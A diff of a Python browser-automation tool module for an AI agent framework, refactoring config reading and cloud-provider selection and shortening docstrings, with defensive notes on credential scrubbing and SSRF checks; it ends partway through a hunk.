@@ -1,52 +1,21 @@
 #!/usr/bin/env python3
-"""
-Browser Tool Module
+"""Browser automation tools driven by the agent-browser CLI.
 
-This module provides browser automation tools using agent-browser CLI.  It
-supports multiple backends — **Browser Use** (cloud, default for Nous
-subscribers), **Browserbase** (cloud, direct credentials), and **local
-Chromium** — with identical agent-facing behaviour.  The backend is
-auto-detected from config and available credentials.
+Backends — local headless Chromium (default; ``agent-browser install
+[--with-deps]`` one-time setup), Browser Use / Browserbase / Firecrawl cloud
+(auto-detected from config + credentials), a user-supplied CDP endpoint, or
+Camofox — share one agent-facing behaviour: per-task sessions, text snapshots
+of the accessibility tree with ``@eN`` element refs, and automatic cleanup.
 
-The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
-page representation, making it ideal for LLM agents without vision capabilities.
+Env: BROWSERBASE_API_KEY / BROWSERBASE_PROJECT_ID / BROWSER_USE_API_KEY select
+direct cloud credentials; BROWSERBASE_PROXIES (default "true"),
+BROWSERBASE_ADVANCED_STEALTH ("false", Scale plan), BROWSERBASE_KEEP_ALIVE
+("true", paid plan) and BROWSERBASE_SESSION_TIMEOUT (seconds, max 21600) tune
+Browserbase sessions. Behavioural settings live under ``browser.*`` in config.yaml.
 
-Features:
-- **Local mode** (default): zero-cost headless Chromium via agent-browser.
-  Works on Linux servers without a display.  One-time setup:
-  ``agent-browser install`` (downloads Chromium) or
-  ``agent-browser install --with-deps`` (also installs system libraries for
-  Debian/Ubuntu/Docker).
-- **Cloud mode**: Browserbase or Browser Use cloud execution when configured.
-- Session isolation per task ID
-- Text-based page snapshots using accessibility tree
-- Element interaction via ref selectors (@e1, @e2, etc.)
-- Task-aware content extraction using LLM summarization
-- Automatic cleanup of browser sessions
-
-Environment Variables:
-- BROWSERBASE_API_KEY: API key for direct Browserbase cloud mode
-- BROWSERBASE_PROJECT_ID: Project ID for direct Browserbase cloud mode
-- BROWSER_USE_API_KEY: API key for direct Browser Use cloud mode
-- BROWSERBASE_PROXIES: Enable/disable residential proxies (default: "true")
-- BROWSERBASE_ADVANCED_STEALTH: Enable advanced stealth mode with custom Chromium,
-  requires Scale Plan (default: "false")
-- BROWSERBASE_KEEP_ALIVE: Enable keepAlive for session reconnection after disconnects,
-  requires paid plan (default: "true")
-- BROWSERBASE_SESSION_TIMEOUT: Custom session timeout in seconds (max 21600 = 6h).
-  Set to extend beyond project default. Common values: 600 (10min), 1800 (30min) (default: none)
-
-Usage:
-    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click
-
-    # Navigate to a page
-    result = browser_navigate("https://example.com", task_id="task_123")
-
-    # Get page snapshot
-    snapshot = browser_snapshot(task_id="task_123")
-
-    # Click an element
-    browser_click("@e5", task_id="task_123")
+Sibling modules hold extracted clusters (eval policy, lightpanda fallback,
+real-profile CDP, snapshot store); their names are re-imported here so
+``patch("tools.browser_tool.X")`` keeps working.
 """
 
 import atexit
@@ -56,7 +25,6 @@ import json
 import logging
 import os
 import signal
-import re
 import subprocess
 import shutil
 import sys
@@ -82,14 +50,10 @@ from hermes_cli._subprocess_compat import windows_hide_flags
 
 
 def __getattr__(name: str):
-    """Lazy module attributes (PEP 562) — import diet for cold start.
+    """Lazy module attributes (PEP 562): ``requests`` and ``call_llm`` load on first use.
 
-    ``requests`` (~40 ms) and ``agent.auxiliary_client.call_llm`` (~65 ms)
-    are only needed on specific code paths, so they load on first use. The
-    module-level names are preserved for the test-patch surface
-    (``patch("tools.browser_tool.requests.get")`` /
-    ``patch("tools.browser_tool.call_llm")``): first attribute access imports
-    the real object and binds it into module globals.
+    First access binds the real object into module globals so the test-patch
+    surface (``patch("tools.browser_tool.requests.get")`` / ``.call_llm``) works.
     """
     if name == "requests":
         import requests as _requests
@@ -112,12 +76,10 @@ def _lazy_call_llm(*args, **kwargs):
         fn = __getattr__("call_llm")
     return fn(*args, **kwargs)
 
-# Browser-specific tool keys passed through to the agent-browser subprocess
-# AFTER credential stripping.  agent-browser is a Node process loading npm
-# deps; handing it the full operator keyring (#29157 / GHSA-m4m8-xjp4-5rmm)
-# means a compromised transitive dependency could read every Hermes secret
-# straight out of process.env.  Strip by default, then re-add only the
-# browser-backend keys the worker legitimately needs.
+# Keys re-added to the agent-browser subprocess env AFTER credential stripping.
+# agent-browser is a Node process loading npm deps: a compromised transitive
+# dependency could read every Hermes secret from process.env, so only the
+# browser-backend keys the worker legitimately needs pass through.
 _BROWSER_PASSTHROUGH_KEYS: tuple[str, ...] = (
     "BROWSERBASE_API_KEY",
     "BROWSERBASE_PROJECT_ID",
@@ -129,13 +91,10 @@ _BROWSER_PASSTHROUGH_KEYS: tuple[str, ...] = (
 
 
 def _build_browser_env() -> dict:
-    """Credential-scrubbed env for an agent-browser subprocess.
+    """Credential-scrubbed env for an agent-browser subprocess (only browser-backend keys re-added).
 
-    Strips Hermes-managed secrets (provider keys, gateway tokens, GitHub auth,
-    infra secrets) then re-adds only the browser-backend keys the worker needs.
-    The ``hermes_subprocess_env`` import is deferred to keep ``browser_tool``
-    importable under test harnesses that load it against a stubbed ``tools``
-    package (tests/tools/test_managed_browserbase_and_modal.py).
+    The ``hermes_subprocess_env`` import is deferred so the module imports under
+    test harnesses that stub the ``tools`` package.
     """
     from tools.environments.local import hermes_subprocess_env
 
@@ -162,11 +121,9 @@ except Exception:
     _is_always_blocked_url = lambda url: True  # noqa: E731 — fail-closed on the floor too
     _normalize_url_for_request = lambda url: url  # noqa: E731 — best-effort fallback
     _sensitive_query_param_name = lambda url: None  # noqa: E731 — best-effort fallback
-# Browser-provider ABC + registry — PR #25214 moved the per-vendor providers
-# (Browserbase / Browser Use / Firecrawl) out of ``tools/browser_providers/``
-# and into ``plugins/browser/<vendor>/``. The dispatcher consults the
-# registry; the legacy class names are re-exported below as backward-compat
-# shims for callers that import them from this module.
+# Browser-provider ABC + registry. Per-vendor providers live under
+# ``plugins/browser/<vendor>/``; the legacy class names are re-exported below as
+# backward-compat shims for callers that import them from this module.
 from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
 from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
     get_provider as _registry_get_browser_provider,
@@ -313,79 +270,72 @@ _snapshot_threshold_resolved = False
 
 
 def _sanitize_url_for_logs(value: object) -> str:
-    """Mask secrets in logged browser endpoint URLs and URL-like errors.
-
-    Thin wrapper over :func:`agent.redact.redact_cdp_url`, which is the single
-    source of truth for CDP-URL log redaction. Kept as a local name because
-    several browser-tool log sites reference it; the redaction policy itself
-    lives once in ``redact.py`` so the browser tool and the CDP supervisor
-    cannot drift apart.
-    """
+    """Mask secrets in logged CDP URLs; :func:`agent.redact.redact_cdp_url` is the single policy."""
     return redact_cdp_url(value)
 
 
-def _get_command_timeout() -> int:
-    """Return the configured browser command timeout from config.yaml.
+def _browser_cfg(key: str, default, parse, log_label: str):
+    """Read ``browser.<key>`` from the raw profile config and ``parse`` it.
 
-    Reads ``config["browser"]["command_timeout"]`` and falls back to
-    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
-    cached after the first call and cleared by ``cleanup_all_browsers()``.
+    Returns ``default`` when the key is absent, the section is not a mapping,
+    or reading/parsing raises (logged at debug as "Could not read <log_label>").
+    Raw config is used so tool JSON output is not affected by loader warnings.
+    """
+    try:
+        from hermes_cli.config import read_raw_config
+        browser_cfg = read_raw_config().get("browser", {})
+        if isinstance(browser_cfg, dict) and key in browser_cfg:
+            return parse(browser_cfg[key])
+    except Exception as e:
+        logger.debug("Could not read %s: %s", log_label, e)
+    return default
+
+
+def _get_command_timeout() -> int:
+    """Return ``browser.command_timeout`` (floored at 5s; default 30s).
+
+    Cached after the first call and cleared by ``cleanup_all_browsers()``.
     """
     global _cached_command_timeout, _command_timeout_resolved
     if _command_timeout_resolved and _cached_command_timeout is not None:
         return _cached_command_timeout
 
-    result = DEFAULT_COMMAND_TIMEOUT
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        val = cfg_get(cfg, "browser", "command_timeout")
-        if val is not None:
-            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
-    except Exception as e:
-        logger.debug("Could not read command_timeout from config: %s", e)
+    result = _browser_cfg(
+        "command_timeout", DEFAULT_COMMAND_TIMEOUT,
+        lambda v: DEFAULT_COMMAND_TIMEOUT if v is None else max(int(v), 5),
+        "command_timeout from config",
+    )
     # Assign the cached value BEFORE flipping the resolved flag so a
-    # concurrent reader cannot observe ``resolved=True`` while the cache
-    # is still ``None`` (see issue #14331).
+    # concurrent reader cannot observe ``resolved=True`` with a ``None`` cache.
     _cached_command_timeout = result
     _command_timeout_resolved = True
     return result
 
 
 def _safe_command_timeout() -> int:
-    """Like ``_get_command_timeout`` but guaranteed non-None.
+    """``_get_command_timeout`` guaranteed non-None (cache reset mid-flight).
 
-    Defense in depth against the race fixed in ``_get_command_timeout``:
-    if anything ever returns ``None`` (e.g. cache reset mid-flight), fall
-    back to ``DEFAULT_COMMAND_TIMEOUT``. Uses ``is not None`` rather than
-    ``or`` so a legitimately configured ``0`` is preserved.
+    Uses ``is not None`` rather than ``or`` so a configured ``0`` is preserved.
     """
     val = _get_command_timeout()
     return val if val is not None else DEFAULT_COMMAND_TIMEOUT
 
 
 def get_browser_snapshot_threshold() -> int:
-    """Return the configured maximum browser snapshot size in characters.
+    """Return ``browser.snapshot_threshold`` (floored at MIN_SNAPSHOT_THRESHOLD).
 
-    Reads the raw profile-aware config so tool JSON output is not affected by
-    config-loader warnings. The value is cached for the browser lifecycle and
-    reset by :func:`cleanup_all_browsers`.
+    Cached for the browser lifecycle and reset by :func:`cleanup_all_browsers`.
     """
     global _cached_snapshot_threshold, _snapshot_threshold_resolved
     if _snapshot_threshold_resolved and _cached_snapshot_threshold is not None:
         return _cached_snapshot_threshold
 
-    result = DEFAULT_SNAPSHOT_THRESHOLD
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        val = cfg_get(cfg, "browser", "snapshot_threshold")
-        if val is not None:
-            result = max(int(val), MIN_SNAPSHOT_THRESHOLD)
-    except Exception as exc:
-        logger.debug("Could not read browser.snapshot_threshold: %s", exc)
-
-    # Preserve the same race-safety invariant as the command-timeout cache.
+    result = _browser_cfg(
+        "snapshot_threshold", DEFAULT_SNAPSHOT_THRESHOLD,
+        lambda v: DEFAULT_SNAPSHOT_THRESHOLD if v is None else max(int(v), MIN_SNAPSHOT_THRESHOLD),
+        "browser.snapshot_threshold",
+    )
+    # Same race-safety invariant as the command-timeout cache.
     _cached_snapshot_threshold = result
     _snapshot_threshold_resolved = True
     return result
@@ -497,16 +447,12 @@ def _get_vision_model() -> Optional[str]:
 
 
 def _resolve_cdp_override(cdp_url: str) -> str:
-    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.
+    """Normalize a user-supplied CDP endpoint into a concrete websocket URL.
 
-    Accepts:
-    - full websocket endpoints: ws://host:port/devtools/browser/...
-    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
-    - bare websocket host:port values like ws://host:port
-
-    For discovery-style endpoints we fetch /json/version and return the
-    webSocketDebuggerUrl so downstream tools always receive a concrete browser
-    websocket instead of an ambiguous host:port URL.
+    Full ``ws://.../devtools/browser/...`` endpoints pass through; HTTP
+    discovery roots and bare ``ws://host:port`` are resolved via
+    ``/json/version`` → ``webSocketDebuggerUrl`` (falls back to the raw value
+    with a warning if discovery fails).
     """
     raw = (cdp_url or "").strip()
     if not raw:
@@ -562,57 +508,28 @@ def _resolve_cdp_override(cdp_url: str) -> str:
 def _get_cdp_override_raw() -> str:
     """Return the *configured* CDP override without any network I/O.
 
-    Precedence is:
-    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
-    2. ``browser.cdp_url`` in config.yaml (persistent config)
-
-    This is the availability-check variant: callers that only need to know
-    *whether* a CDP override is configured (tool ``check_fn`` gates,
-    ``_is_local_mode`` / ``_is_local_backend`` routing decisions,
-    ``hermes doctor``) MUST use this instead of :func:`_get_cdp_override`.
-
-    Rationale: ``_get_cdp_override`` resolves the endpoint over HTTP
-    (``/json/version`` discovery, 10s timeout). Tool-schema assembly runs at
-    every CLI/Desktop startup and probes several browser-family check_fns;
-    when a *stale* ``browser.cdp_url`` points at a dead endpoint (the debug
-    Chrome it referenced is long gone), each check blocked on a failing
-    socket connect and startup stalled for 10+ seconds before the banner —
-    with no error, just mystery slowness. Same principle as the existing
-    "do not execute ``agent-browser --version`` here" rule in
-    ``check_browser_requirements``: no side effects during schema build.
+    Precedence: ``BROWSER_CDP_URL`` env (live ``/browser connect`` override),
+    then ``browser.cdp_url`` in config.yaml. Callers that only need to know
+    *whether* an override exists (check_fn gates, ``_is_local_mode`` /
+    ``_is_local_backend``, ``hermes doctor``) MUST use this, not
+    :func:`_get_cdp_override`: that one does a 10s HTTP discovery, and a stale
+    ``cdp_url`` pointing at a dead Chrome would stall every startup's schema
+    build with no error — no side effects during schema build.
     """
     env_override = os.environ.get("BROWSER_CDP_URL", "").strip()
     if env_override:
         return env_override
-
-    try:
-        from hermes_cli.config import read_raw_config
-
-        cfg = read_raw_config()
-        browser_cfg = cfg.get("browser", {})
-        if isinstance(browser_cfg, dict):
-            return str(browser_cfg.get("cdp_url", "") or "").strip()
-    except Exception as e:
-        logger.debug("Could not read browser.cdp_url from config: %s", e)
-
-    return ""
+    return _browser_cfg(
+        "cdp_url", "", lambda v: str(v or "").strip(), "browser.cdp_url from config"
+    )
 
 
 def _get_cdp_override() -> str:
-    """Return a normalized CDP URL override, or empty string.
+    """Return the resolved CDP URL override, or "" (skips cloud AND local launch).
 
-    Precedence is:
-    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
-    2. ``browser.cdp_url`` in config.yaml (persistent config)
-
-    When either is set, we skip both Browserbase and the local headless
-    launcher and connect directly to the supplied Chrome DevTools Protocol
-    endpoint.
-
-    NOTE: resolution may perform an HTTP ``/json/version`` discovery request.
-    Only call this on paths that are about to *connect* (session creation,
-    supervisor attach). Pure is-it-configured gates must use
-    :func:`_get_cdp_override_raw`.
+    May perform an HTTP ``/json/version`` discovery request — only call on
+    paths about to *connect* (session creation, supervisor attach); pure
+    is-it-configured gates must use :func:`_get_cdp_override_raw`.
     """
     raw = _get_cdp_override_raw()
     if not raw:
@@ -659,21 +576,12 @@ def _get_dialog_policy_config() -> Tuple[str, float]:
 def _ensure_cdp_supervisor(task_id: str) -> None:
     """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.
 
-    Idempotent — delegates to ``SupervisorRegistry.get_or_start`` which skips
-    when a supervisor for this ``(task_id, cdp_url)`` already exists and
-    tears down + restarts on URL change. Safe to call on every
-    ``browser_navigate`` / ``/browser connect`` without worrying about
-    double-attach.
-
-    Resolves the CDP URL in this order:
-      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` — covers ``/browser connect``
-         and config-set overrides.
-      2. ``_active_sessions[task_id]["cdp_url"]`` — covers Browserbase + any
-         other cloud provider whose ``create_session`` returns a raw CDP URL.
-
-    Swallows all errors — failing to attach the supervisor must not break
-    the browser session itself.  The agent simply won't see
-    ``pending_dialogs`` / ``frame_tree`` fields in snapshots.
+    Idempotent (``SupervisorRegistry.get_or_start`` skips an existing
+    ``(task_id, cdp_url)`` and restarts on URL change), so safe on every
+    navigate / ``/browser connect``. URL precedence: the CDP override, then the
+    session's own ``cdp_url`` (cloud providers). Swallows all errors — a failed
+    attach must not break the session; snapshots just lack
+    ``pending_dialogs`` / ``frame_tree``.
     """
     cdp_url = _get_cdp_override()
     if not cdp_url:
@@ -718,18 +626,11 @@ def _stop_cdp_supervisor(task_id: str) -> None:
 # Cloud Provider Registry
 # ============================================================================
 #
-# Per-vendor browser providers (Browserbase / Browser Use / Firecrawl) live as
-# plugins under ``plugins/browser/<vendor>/`` and self-register through
-# :mod:`agent.browser_registry` at plugin-discovery time. The legacy
-# class-name registry below is preserved as a backward-compat shim so test
-# fixtures that ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)``
-# keep working — but ``_get_cloud_provider()`` now consults
-# :mod:`agent.browser_registry` for the actual lookup.
-#
-# When the test patches ``_PROVIDER_REGISTRY``, we honour it (so the cache
-# unit tests still drive the function); otherwise the registry-backed path
-# wins. This keeps the test surface stable while letting third-party
-# plugins drop in under ``~/.hermes/plugins/browser/<vendor>/``.
+# Per-vendor providers live as plugins under ``plugins/browser/<vendor>/`` and
+# self-register with :mod:`agent.browser_registry`, which is what
+# ``_get_cloud_provider()`` consults. The legacy class-name dict below is a
+# backward-compat shim: when a test monkeypatches it, it is honoured;
+# otherwise the registry-backed path wins.
 
 _PROVIDER_REGISTRY: Dict[str, type] = {
     "browserbase": BrowserbaseProvider,
@@ -760,18 +661,11 @@ _browser_engine_resolved = False
 
 
 def _is_legacy_provider_registry_overridden() -> bool:
-    """Return True when a test has patched ``_PROVIDER_REGISTRY`` to a custom value.
+    """True when a test has patched ``_PROVIDER_REGISTRY`` to a custom value.
 
-    Detected by spotting any registered class that *isn't* the canonical
-    plugin-backed class for that name. Tests that
-    ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)`` install
-    custom factories (`exploding_factory`, `lambda: fake_provider`, etc.);
-    those entries fail the canonical-class identity check below.
-
-    Note: a future maintainer adding a 4th built-in provider only needs to
-    extend ``_DEFAULT_PROVIDER_REGISTRY`` below — they do NOT need to update
-    a hardcoded set of keys here. The detection just compares each registered
-    value against the corresponding canonical class.
+    Each registered value is compared by identity against the canonical class
+    in ``_DEFAULT_PROVIDER_REGISTRY`` (extra keys count too); adding a built-in
+    provider only requires extending that default dict.
     """
     try:
         for key, default_cls in _DEFAULT_PROVIDER_REGISTRY.items():
@@ -786,13 +680,9 @@ def _is_legacy_provider_registry_overridden() -> bool:
 def _ensure_browser_plugins_loaded() -> None:
     """Idempotently trigger plugin discovery so the browser registry is populated.
 
-    Normally `model_tools` is imported early in any session and that
-    triggers `discover_plugins()` as a side effect. But `_get_cloud_provider`
-    can be called from contexts that haven't gone through `model_tools` —
-    standalone scripts, certain unit-test paths, the parity-sweep harness.
-    Make discovery idempotent and side-effect-only here so users always
-    see registered plugins regardless of import order. Cheap: subsequent
-    calls early-return inside `_ensure_plugins_discovered`.
+    ``model_tools`` normally does this as an import side effect, but
+    ``_get_cloud_provider`` is also reached from standalone scripts and test
+    harnesses that never import it; cheap on repeat calls.
     """
     try:
         from hermes_cli.plugins import _ensure_plugins_discovered
@@ -842,22 +732,72 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
             return resolved
 
 
+def _instantiate_explicit_cloud_provider(provider_key: str) -> Optional[CloudBrowserProvider]:
+    """Build the provider named by ``browser.cloud_provider``.
+
+    Test fixtures that patch ``_PROVIDER_REGISTRY`` drive the legacy dict;
+    otherwise the plugin registry is consulted (after idempotent discovery).
+    Strict selection: a stored-but-unregistered name raises ``ValueError``
+    (never a silent reroute to auto-detect). Any other instantiation error is
+    logged and yields None so the next call retries.
+    """
+    try:
+        if _is_legacy_provider_registry_overridden():
+            factory = _PROVIDER_REGISTRY.get(provider_key)
+            resolved = factory() if factory is not None else None
+        else:
+            _ensure_browser_plugins_loaded()
+            resolved = _registry_get_browser_provider(provider_key)
+        if resolved is None:
+            from tools.tool_backend_helpers import selection_error
+
+            raise ValueError(selection_error(
+                "browser",
+                f"'{provider_key}'",
+                "no registered browser plugin has that name (install "
+                "the corresponding plugin or fix the config key "
+                "spelling)",
+            ))
+        return resolved
+    except ValueError:
+        raise
+    except Exception:
+        logger.warning(
+            "Failed to instantiate explicit cloud_provider %r; will retry on next call",
+            provider_key,
+            exc_info=True,
+        )
+        return None
+
+
+def _autodetect_cloud_provider() -> Optional[CloudBrowserProvider]:
+    """Auto-detect: Browser Use (managed Nous gateway or API key), then Browserbase.
+
+    Uses the legacy class names bound on this module so tests that
+    ``monkeypatch.setattr(browser_tool, "BrowserUseProvider", ...)`` keep
+    driving this branch. Third-party plugins are intentionally NOT reachable
+    from auto-detect — only via explicit ``browser.cloud_provider: <name>``.
+    Never raises (a failure must not poison the cache).
+    """
+    try:
+        for cls in (BrowserUseProvider, BrowserbaseProvider):
+            fallback_provider = cls()
+            if fallback_provider.is_configured():
+                return fallback_provider
+    except Exception:  # pragma: no cover - defensive: never poison cache
+        logger.debug("Cloud provider auto-detect failed", exc_info=True)
+    return None
+
+
 def _resolve_cloud_provider_uncached() -> Optional[CloudBrowserProvider]:
     """Return the configured cloud browser provider, or None for local mode.
 
-    Reads ``config["browser"]["cloud_provider"]`` once and caches the result
-    for the process lifetime. An explicit ``local`` provider disables cloud
-    fallback. If unset, fall back to Browser Use (managed Nous gateway or
-    direct API key) and then Browserbase (direct credentials only) — the
-    historic auto-detect order, now expressed as the
-    :data:`agent.browser_registry._LEGACY_PREFERENCE` walk.
-
-    Selection routes through :mod:`agent.browser_registry` so third-party
-    browser plugins (``~/.hermes/plugins/browser/<vendor>/``) participate
-    in explicit-config resolution. Test fixtures that override
-    ``_PROVIDER_REGISTRY`` or ``BrowserUseProvider`` / ``BrowserbaseProvider``
-    on this module still drive the function — see
-    ``_is_legacy_provider_registry_overridden``.
+    Reads ``browser.cloud_provider`` and pins the result in the cache only when
+    it is definitive (explicit ``local``/``camofox``, or a resolved provider).
+    Explicit selection routes through :mod:`agent.browser_registry` so
+    third-party plugins participate; auto-detect (only when no selection was
+    ever written) walks Browser Use then Browserbase. A transient None
+    (unreadable config, missing credentials) is NOT cached so it can self-heal.
     """
     global _cached_cloud_provider, _cloud_provider_resolved
 
@@ -865,89 +805,31 @@ def _resolve_cloud_provider_uncached() -> Optional[CloudBrowserProvider]:
     provider_key = None
     try:
         from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        browser_cfg = cfg.get("browser", {})
+        browser_cfg = read_raw_config().get("browser", {})
         if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
-            provider_key = normalize_browser_cloud_provider(
-                browser_cfg.get("cloud_provider")
-            )
+            provider_key = normalize_browser_cloud_provider(browser_cfg.get("cloud_provider"))
             if provider_key in ("local", "camofox"):
-                # Camofox runs through the built-in browser tools
-                # (is_camofox_mode() dispatch), not a cloud provider.
+                # Camofox runs through the built-in browser tools, not a cloud provider.
                 _cached_cloud_provider = None
                 _cloud_provider_resolved = True
                 return None
             if provider_key == "nous":
-                # Managed "Nous Subscription" selection is serviced by the
-                # Browser Use provider, whose config resolver routes it
-                # through the managed browser-use gateway.
+                # Managed "Nous Subscription" is serviced by the Browser Use provider.
                 provider_key = "browser-use"
         if provider_key:
-            try:
-                if _is_legacy_provider_registry_overridden():
-                    # Test fixture path: honour the patched dict so the
-                    # cache-policy unit tests keep working.
-                    factory = _PROVIDER_REGISTRY.get(provider_key)
-                    if factory is not None:
-                        resolved = factory()
-                else:
-                    # Ensure plugins are discovered so the registry is
-                    # populated. Idempotent — cheap on subsequent calls.
-                    _ensure_browser_plugins_loaded()
-                    resolved = _registry_get_browser_provider(provider_key)
-                if resolved is None:
-                    # Strict selection: a stored-but-unregistered name is an
-                    # honest error, never a silent reroute to auto-detect.
-                    from tools.tool_backend_helpers import selection_error
-
-                    raise ValueError(selection_error(
-                        "browser",
-                        f"'{provider_key}'",
-                        "no registered browser plugin has that name (install "
-                        "the corresponding plugin or fix the config key "
-                        "spelling)",
-                    ))
-            except ValueError:
-                raise
-            except Exception:
-                logger.warning(
-                    "Failed to instantiate explicit cloud_provider %r; will retry on next call",
-                    provider_key,
-                    exc_info=True,
-                )
+            resolved = _instantiate_explicit_cloud_provider(provider_key)
+            if resolved is None:
                 return None
     except ValueError:
         raise
     except Exception as e:
-        # Config file may be temporarily unreadable; still try auto-detect so
+        # Config may be temporarily unreadable; still try auto-detect so
         # env-based / managed-gateway credentials can resolve. Don't pin cache.
         logger.debug("Could not read cloud_provider from config: %s", e)
 
     if resolved is None and provider_key is None:
-        # Auto-detect path — permitted ONLY when no cloud_provider selection
-        # was ever written: Browser Use first (managed Nous gateway or
-        # direct API key), then Browserbase (direct credentials). Uses
-        # the legacy class names imported at the top of this module so
-        # tests that ``monkeypatch.setattr(browser_tool, "BrowserUseProvider", ...)``
-        # keep driving this branch deterministically. Third-party browser
-        # plugins are intentionally NOT reachable from auto-detect — they
-        # participate only via explicit ``browser.cloud_provider: <name>``,
-        # mirroring the firecrawl gate documented on
-        # :data:`agent.browser_registry._LEGACY_PREFERENCE`.
-        try:
-            fallback_provider = BrowserUseProvider()
-            if fallback_provider.is_configured():
-                resolved = fallback_provider
-            else:
-                fallback_provider = BrowserbaseProvider()
-                if fallback_provider.is_configured():
-                    resolved = fallback_provider
-        except Exception:  # pragma: no cover - defensive: never poison cache
-            logger.debug("Cloud provider auto-detect failed", exc_info=True)
-            return None
-
+        resolved = _autodetect_cloud_provider()
     if resolved is None:
-        # Transient None — credentials may self-heal. Don't poison the cache.
         return None
 
     _cached_cloud_provider = resolved
@@ -1003,40 +885,22 @@ def _is_local_mode() -> bool:
 def _is_local_backend() -> bool:
     """Return True when the browser runs locally AND the terminal is also local.
 
-    SSRF protection is only meaningful for cloud backends (Browserbase,
-    BrowserUse) where the agent could reach internal resources on a remote
-    machine.  For local backends — Camofox, or the built-in headless
-    Chromium without a cloud provider — the user already has full terminal
-    and network access on the same machine, so the check adds no security
-    value.
-
-    However, when the terminal runs in a container (docker, modal, daytona,
-    ssh, singularity), the browser on the host can access internal networks
-    that the terminal cannot.  In this case, SSRF protection should be
-    enabled even though the browser is technically "local".
+    SSRF protection only matters when the browser can reach networks the user's
+    terminal cannot: cloud backends, and a local browser paired with a
+    containerized terminal (docker/modal/daytona/ssh/singularity). A CDP
+    override is never trusted as local (that Chrome may live off-host) and MUST
+    be checked before the Camofox short-circuit so Camofox + override still
+    fails the local check; ``_is_local_mode`` treats overrides the same way —
+    keep the two in agreement.
     """
-    # A CDP override points the browser at a separate Chrome process whose
-    # network position is not guaranteed to match the terminal (it may live
-    # off-host). Don't treat it as a trusted local backend — otherwise a
-    # model-driven navigate could reach internal/metadata services reachable
-    # from the CDP host but not the terminal. This MUST be checked before the
-    # camofox short-circuit below so a Camofox backend combined with a CDP
-    # override still fails the local check instead of returning local and
-    # skipping the private/internal SSRF gate. The override is honored from
-    # either the BROWSER_CDP_URL env var or a persistent `browser.cdp_url`
-    # config (both via _get_cdp_override(), and both now suppress camofox in
-    # browser_camofox.py). _is_local_mode() already treats any CDP override as
-    # non-local; keep the two helpers in agreement.
     if _get_cdp_override_raw():
         return False
     if _is_camofox_mode():
         return True
     if _get_cloud_provider() is not None:
         return False
-    # When terminal runs in a container, browser on host can access
-    # internal networks the terminal can't → treat as non-local.
-    # Scope-aware: under gateway multiplexing the routed profile's backend
-    # lives in the per-turn terminal scope, not the process env (#68559).
+    # Scope-aware: under gateway multiplexing the routed profile's terminal
+    # backend lives in the per-turn terminal scope, not the process env.
     from tools.terminal_scope import terminal_env
 
     terminal_backend = terminal_env("TERMINAL_ENV", "local").strip().lower()
@@ -1048,16 +912,10 @@ _cached_auto_local_for_private_urls: bool = True
 
 
 def _get_browser_engine() -> str:
-    """Return the configured browser engine (``auto``, ``lightpanda``, or ``chrome``).
+    """Return the browser engine: ``auto`` (no ``--engine`` flag), ``lightpanda`` or ``chrome``.
 
-    Reads ``config["browser"]["engine"]`` once and caches the result.
-    Falls back to the ``AGENT_BROWSER_ENGINE`` env var, then ``auto``.
-
-    ``auto`` means: don't pass ``--engine`` at all (agent-browser defaults to
-    Chrome).  ``lightpanda`` or ``chrome`` are forwarded as
-    ``--engine <value>`` to agent-browser v0.25.3+.
-
-    Lightpanda is 1.3-5.8x faster on navigation but has no graphical
+    ``browser.engine`` first, then ``AGENT_BROWSER_ENGINE``, then ``auto``;
+    cached. Lightpanda is much faster on navigation but has no graphical
     renderer (no screenshots).
     """
     global _cached_browser_engine, _browser_engine_resolved
@@ -1065,19 +923,12 @@ def _get_browser_engine() -> str:
         return _cached_browser_engine
 
     _browser_engine_resolved = True
-    _cached_browser_engine = "auto"  # safe default
-
-    # Config file takes priority
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        val = cfg.get("browser", {}).get("engine")
-        if val and str(val).strip():
-            _cached_browser_engine = str(val).strip().lower()
-    except Exception as e:
-        logger.debug("Could not read browser.engine from config: %s", e)
-
-    # Fall back to env var (only if config didn't set a value)
+    # Config file takes priority; env var only if config didn't set a value.
+    _cached_browser_engine = _browser_cfg(
+        "engine", "auto",
+        lambda v: str(v).strip().lower() if v and str(v).strip() else "auto",
+        "browser.engine from config",
+    )
     if _cached_browser_engine == "auto":
         env_val = os.environ.get("AGENT_BROWSER_ENGINE", "").strip().lower()
         if env_val:
@@ -1110,17 +961,11 @@ def _is_headed_mode() -> bool:
         return _cached_headed_mode  # type: ignore[return-value]
 
     _headed_mode_resolved = True
-    _cached_headed_mode = False
-
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        val = cfg.get("browser", {}).get("headed")
-        if val is not None:
-            _cached_headed_mode = str(val).strip().lower() in ("true", "1", "yes")
-    except Exception as e:
-        logger.debug("Could not read browser.headed from config: %s", e)
-
+    _cached_headed_mode = _browser_cfg(
+        "headed", False,
+        lambda v: False if v is None else str(v).strip().lower() in ("true", "1", "yes"),
+        "browser.headed from config",
+    )
     if not _cached_headed_mode:
         env_val = os.environ.get("AGENT_BROWSER_HEADED", "").strip()
         if env_val and env_val.lower() in ("true", "1", "yes"):
@@ -1142,371 +987,34 @@ def _should_inject_engine(engine: str) -> bool:
     return _is_local_mode()
 
 
-def _using_lightpanda_engine() -> bool:
-    """Return True when local browser commands are configured for Lightpanda."""
-    return _get_browser_engine() == "lightpanda"
-
-
-def lightpanda_engine_status() -> Tuple[bool, str]:
